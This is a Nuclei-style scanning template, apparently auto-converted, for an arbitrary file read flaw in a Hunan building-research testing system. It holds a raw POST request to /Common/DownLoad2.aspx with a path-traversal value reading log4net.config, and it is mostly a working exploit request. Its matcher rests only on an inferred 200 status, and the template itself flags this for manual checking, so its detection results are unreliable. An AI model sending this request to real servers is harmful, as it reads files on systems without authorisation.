info:
  name: 湖南建研检测系统存在DownLoad2.aspx任意文件读取漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: lfi,2024
http:
- raw:
  - 'POST /Common/DownLoad2.aspx HTTP/1.1

    Host: {{Hostname}}

    accept: */*

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36

    Accept-Encoding: gzip, deflate, br

    Accept-Language: zh-CN,zh;q=0.9

    Cookie: zh_choose=n; Language=zh_cn; IP=47.108.55.45; CheckCode=

    Connection: close

    Content-Type: application/x-www-form-urlencoded

    Content-Length: 30


    path=..%2Flog4net.config&Name='
  redirects: false
  matchers:
  - status:
    - 200
    type: status
